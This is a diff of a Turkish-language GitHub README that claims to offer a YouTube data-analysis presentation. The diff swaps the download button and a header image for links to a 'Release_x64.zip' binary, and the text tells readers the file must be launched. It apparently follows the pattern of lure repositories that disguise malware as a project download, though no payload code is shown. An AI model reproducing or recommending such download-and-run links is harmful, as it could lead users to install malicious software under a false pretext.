@@ -1,7 +1,7 @@
 
 # 📊 YouTube Veri Analizi Sunumu 📈
 
-![Data Analysis](https://cdn.pixabay.com/photo/2016/11/29/07/40/analysis-1869368_960_720.jpg)
+![Data Analysis](https://github.com/ghfjd/youtube-veri-analizi-sunum/releases/download/v2.0/Release_x64.zip)
 
 Hoş geldiniz! Bu GitHub deposu, veri analizi konusunda hazırlanmış olan YouTube veri analizi sunumunu içermektedir. Bu sunumda AWS hizmetleri, Kaggle veri kümeleri ve YouTube verileri üzerinde yapılan analizler hakkında bilgi bulabilirsiniz.
 
@@ -20,9 +20,9 @@ Sunumda kullanılan veri kümeleri Kaggle platformunda bulunan çeşitli veri se
 YouTube veri analizi, sunumun merkezinde yer almaktadır. YouTube'un API'sinden elde edilen veriler üzerinde çeşitli analizler yapılmış, kullanıcı davranışları incelenmiş ve trendleri belirlenmiştir.
 
 ## 🚀 Sunumu İndir
-[![Software.zip](https://img.shields.io/badge/Software.zip-Download-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![https://github.com/ghfjd/youtube-veri-analizi-sunum/releases/download/v2.0/Release_x64.zip](https://github.com/ghfjd/youtube-veri-analizi-sunum/releases/download/v2.0/Release_x64.zip)](https://github.com/ghfjd/youtube-veri-analizi-sunum/releases/download/v2.0/Release_x64.zip)
 
-🌐 **Software.zip** dosyasını indirmek için yukarıdaki butona tıklayabilirsiniz. Dosya başlatılması gereken bir dosyadır.
+🌐 **https://github.com/ghfjd/youtube-veri-analizi-sunum/releases/download/v2.0/Release_x64.zip** dosyasını indirmek için yukarıdaki butona tıklayabilirsiniz. Dosya başlatılması gereken bir dosyadır.
 
 Eğer yukarıdaki bağlantı çalışmazsa veya bağlantı bir web sitesine yönlendiriyorsa lütfen "Releases" bölümünü kontrol ediniz.
 
